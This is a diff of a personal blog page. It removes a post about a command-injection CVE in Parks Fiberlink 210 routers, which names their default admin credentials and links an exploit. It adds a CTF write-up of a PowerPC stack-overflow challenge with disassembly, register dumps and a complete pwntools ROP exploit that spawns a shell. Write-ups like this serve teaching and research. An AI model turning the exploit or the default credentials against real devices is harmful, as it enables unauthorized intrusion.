@@ -15,33 +15,44 @@
       <div class="flex-auto bg-mantle"></div>
       <div class="flex-none p-4">
         <article class="max-w-[90ch] leading-relaxed [&amp;>p]:p-2 break-words">
-          <p>tldr; I found this command injection vulnerability and registered it as <span class="text-blue"><a href="https://www.cve.org/CVERecord?id=CVE-2023-33617">CVE-2023-33617</a></span></p>
-          <p>This <span class="text-blue"><a href="https://www.cve.org/CVERecord?id=CVE-2023-33617">CVE</a></span> is an Authenticated Command Injection vulnerability. It affects Parks Fiberlink 210 routers, in the firmware version <span class="text-peach bg-mantle p-1 rounded-md"><code>V2.1.14_X000</code></span> .</p>
-          <p>This vulnerability has already been fixed in the version <span class="text-peach bg-mantle p-1 rounded-md"><code>V2.1.15_X000</code></span> , but there are several vulnerable routers on the Internet.</p>
-          <img class="max-w-xl block rounded-md p-4 mx-auto" src="/static/CVE-2023-33617-shodan-00.jpg">
-          <p>Parks is a Brazillian company that sells devices for enterprise, they seem to be the only ones who sell this router.</p>
-          <p>I've written an exploit in Python, [here it is]( <span class="text-blue"><a href="https://gist.github.com/gbrls/58a5032bc58510abb908386124d1b4d2">https://gist.github.com/gbrls/58a5032bc58510abb908386124d1b4d2</a></span> ). It leverages the default credentials, which are <span class="text-peach bg-mantle p-1 rounded-md"><code>admin:parks</code></span> , and checks if the version is vulnerable.</p>
-          <p>If you have access to a router and want to manually check if you're vulnerable, check the "Software Version".</p>
-          <img class="max-w-xl block rounded-md p-4 mx-auto" src="/static/CVE-2023-33617-01.jpg">
           <div class="text-mauve text-3xl p-8">
-            <h2>Hacking IoT devices is fun</h2>
+            <h2>Sp33d1</h2>
           </div>
-          <p>If you were here only for the technical details, that was it. Here I'll write like I usually do in my other blogs and explain the story of how I found this vulnerabiliy.</p>
-          <p>Desktops nowdays have had their security significantly improved over the years, to the point that the Anti Virus that comes out of the box in Windows is not even bad. But have you ever heard about a router running an Antivirus? Have you ever seem a router be updated? Yeah, and guess what, routers are in a very good position in a network, they're taken for granted and often have their security overlooked.</p>
-          <p>The thing that happens in routers that makes them specially vulnerable is that:</p>
+          <p>This was a speedpwn challenge. I unfortunately wasn't able to play the CTF, it only lasted 24h and I was busy the whole saturday, some kind of shabbos you can say.</p>
+          <p>This is a powerpc ROP challenge. Below is the disassembly of the <span class="text-peach bg-mantle p-1 rounded-md"><code>main</code></span> function. The vulnerability is that we have a <span class="text-peach bg-mantle p-1 rounded-md"><code>gets</code></span> that stores a string of any length in a stack variable, giving us a stack buffer overflow.</p>
+          <pre>> PowerPC ELF32 2's complement, big endian<br>RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE<br>Full RELRO      No canary found   NX enabled    No PIE          N/A        N/A          2043 Symbols      N/A   0               0               sp33d1</pre>
+          <pre>stwu r1, -0x20(r1)<br>mflr r0<br>stw r0, 0x24(r1)<br>stw r31, 0x1c(r1)<br>mr r31, r1<br>lis r9, 0x100c<br>lwz r9, 0x1210(r9)          ; 0x100c0278<br>                            ; obj._IO_2_1_stdin_<br>li r6, 0                    ; size_t size<br>li r5, 2                    ; int mode<br>li r4, 0                    ; char *buf<br>mr r3, r9                   ; FILE*stream<br>bl sym.setvbuf              ; int setvbuf(FILE*stream, char *buf, int mode, size_t size)<br>lis r9, 0x100c<br>lwz r9, 0x120c(r9)          ; 0x100c0148<br>                            ; obj._IO_2_1_stdout_<br>li r6, 0                    ; size_t size<br>li r5, 2                    ; int mode<br>li r4, 0                    ; char *buf<br>mr r3, r9                   ; FILE*stream<br>bl sym.setvbuf              ; int setvbuf(FILE*stream, char *buf, int mode, size_t size)<br>li r3, 0x3c<br>bl sym.alarm<br>bl sym.banner<br>lis r9, 0x1007<br>addi r3, r9, 0x6f70         ; int32_t arg1<br>crclr cr1eq<br>bl sym.__printf<br>addi r9, r31, 8<br>mr r3, r9                   ; char *s<br>crclr cr1eq<br>bl sym.gets                 ; char *gets(char *s)<br>li r9, 0<br>mr r3, r9<br>addi r11, r31, 0x20<br>lwz r0, 4(r11)<br>mtlr r0<br>lwz r31, -4(r11)<br>mr r1, r11<br>blr</pre>
+          <p>Note that at the function's epilogue we have:</p>
           <ul>
-            <li>They usually have a WAN and LAN interface.</li>
-            <li>Vendors often use the same admin credentials for all the devices they ship.</li>
-            <li>Exposing your router's admin page to the Internet is as easy as changing the listening interface from <span class="text-peach bg-mantle p-1 rounded-md"><code>127.0.0.1</code></span> to <span class="text-peach bg-mantle p-1 rounded-md"><code>0.0.0.0</code></span> .</li>
+            <li><span class="text-peach bg-mantle p-1 rounded-md"><code>lwz r0, 4(r11)</code></span> > load <span class="text-peach bg-mantle p-1 rounded-md"><code>r11[4]</code></span> to <span class="text-peach bg-mantle p-1 rounded-md"><code>r0</code></span></li>
+            <li><span class="text-peach bg-mantle p-1 rounded-md"><code>mtlr r0</code></span> > move <span class="text-peach bg-mantle p-1 rounded-md"><code>r0</code></span> to link register</li>
+            <li><span class="text-peach bg-mantle p-1 rounded-md"><code>blr</code></span> > branch to link register</li>
           </ul>
-          <p>Once you have access to one of those devices, there are multiple ways to go from admin to root. Routers are a good target for exploitation so there are many public CVEs. But if you don't find any exploitable CVE, there are two ways to go from there:</p>
+          <p>In gdb those are the registers right at the function's epilogue. By sending an input with <span class="text-peach bg-mantle p-1 rounded-md"><code>cyclic(0x100)</code></span> we can see that we control:</p>
           <ul>
-            <li>Reversing firmware patches from the router itself and it's software dependencies. <em>(This is how we look for non-public vulnerabilities)</em></li>
-            <li>Looking for 0-days.</li>
+            <li>R0</li>
+            <li>R1</li>
+            <li>R11</li>
+            <li>R31</li>
+            <li>LR</li>
           </ul>
-          <p>The approach that I like to use to find new vulnerabilities is to look for critical functionalities or dangerous funcionalities. e.g. The vulnerability for this CVE comes from the ping funcionality in the router, it takes user input and sends it to the ping command, this smells of command injection, and this is what I follow, the smell.</p>
-          <img class="max-w-xl block rounded-md p-4 mx-auto" src="/static/CVE-2023-33617-00.jpg">
-          <p>That's it, Happy Hacking!</p>
+          <pre> R0   0x68616161 ('haaa')<br>*R1   0x407ff8d0 ◂— 0x67616161 ('gaaa')<br> R2   0x100cc580 ◂— 0<br> R3   0<br> R4   0x100c02bf (_IO_2_1_stdin_+71) ◂— 0xa100c1c<br> R5   1<br> R6   0xa<br> R7   0x100c02c0 (_IO_2_1_stdin_+72) —▸ 0x100c1c08 (_IO_stdfile_0_lock) ◂— 0<br> R8   0x100c0278 (_IO_2_1_stdin_) ◂— 0xfbad208b<br> R9   0<br> R10  1<br> R11  0x407ff8d0 ◂— 0x67616161 ('gaaa')<br> R12  0x40000222 ◂— 0<br> R13  0x100c91f8 ◂— 0<br> R14  0<br> R15  0<br> R16  0<br> R17  0<br> R18  0<br> R19  0<br> R20  0<br> R21  0x100c0000 —▸ 0x100c91f8 ◂— 0<br> R22  0x10000634 (main) ◂— stwu r1, -0x20(r1)<br> R23  0x100c12c8 (environ) —▸ 0x407ffb4c —▸ 0x407ffd09 ◂— 'DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus'<br> R24  0x10000138 (_init) ◂— stwu r1, -0x10(r1)<br> R25  0x100bcdb4 —▸ 0x100c0d14 (_nl_global_locale+16) —▸ 0x100bd8b4 (_nl_C_LC_MONETARY) —▸ 0x100c1268 (_nl_C_name) ◂— 0x43000000 /* 'C' */<br> R26  0x407ffb4c —▸ 0x407ffd09 ◂— 'DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus'<br> R27  0x407ffc2c ◂— 0x16<br> R28  0x407ffb44 —▸ 0x407ffd00 ◂— './sp33d1'<br> R29  1<br> R30  0x100bfff0 (_GLOBAL_OFFSET_TABLE_) ◂— 0<br> R31  0x66616161 ('faaa')<br> CR   0x20000222<br> CTR  0x10014b00 (_IO_file_read) ◂— stwu r1, -0x10(r1)<br>*SP   0x407ff8d0 ◂— 0x67616161 ('gaaa')<br> LR   0x68616161 ('haaa')<br>*PC   0x100006c8 (main+148) ◂— blr</pre>
+          <p>Given that, we control the execution flow and can start ROP'ing.</p>
+          <p>There a a few things that make our life easier:</p>
+          <ul>
+            <li>there's no PIE.</li>
+            <li>the ELF is statically linked.</li>
+            <li>we have the <span class="text-peach bg-mantle p-1 rounded-md"><code>/bin/sh</code></span> string at <span class="text-peach bg-mantle p-1 rounded-md"><code>0x10077a8c</code></span></li>
+            <li>we have the <span class="text-peach bg-mantle p-1 rounded-md"><code>win</code></span> function at <span class="text-peach bg-mantle p-1 rounded-md"><code>0x100005f8</code></span> which calls system</li>
+          </ul>
+          <p>The only thing we need to do is to setup the <span class="text-peach bg-mantle p-1 rounded-md"><code>/bin/sh</code></span> as the first argument, and then go to <span class="text-peach bg-mantle p-1 rounded-md"><code>win</code></span> .</p>
+          <p>I tried using <span class="text-peach bg-mantle p-1 rounded-md"><code>ROPGadget</code></span> but it didn't work with the ppc ELF, even though it's supported, instead of trying to fix it, I just tried with <span class="text-peach bg-mantle p-1 rounded-md"><code>ropper</code></span> and it worked.</p>
+          <p>Most gadgets found by the tool look like this:</p>
+          <ul>
+            <li>0x100716e4: add r1, r1, r10; blr;</li>
+          </ul>
+          <p>This is different that I'm used to do when ROP'ing, since x64 the <span class="text-peach bg-mantle p-1 rounded-md"><code>ret</code></span> instruction can be used to chain our ROP. Below is the full solution:</p>
+          <pre><br>from pwn import *<br><br>context(arch='PowerPC', bits=32, endian='big')<br><br>#io = remote('sp33d.play.hfsc.tf', 20020)<br>#io = gdb.debug('./sp33d1', 'b main')<br>io = process('./sp33d1')<br><br>set_r3 = 0x100712b4 # lwz r3, 0x10(r1); lwz r0, 0x24(r1); lwz r30, 0x18(r1); addi r1, r1, 0x20; mtlr r0; blr;<br><br>win = 0x100005f8<br>bin_sh = 0x10077a8c<br><br>io.sendline(flat([<br>    b'a' * 0x1c,<br>    p32(set_r3 + 2),<br>    p32(win + 2),<br>    b'b' * 4,<br>    p32(bin_sh),<br>    b'c' * 0x10,<br>    p32(win),<br>]))<br><br>io.interactive()</pre>
         </article>
         <div class="mt-4 mb-4"><svg style="overflow: visible;" class="typst-doc" viewBox="0 0 297.6377952755906 2.8346456692913384" width="297.6377952755906pt" height="2.8346456692913384pt" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:h5="http://www.w3.org/1999/xhtml">
     <g>
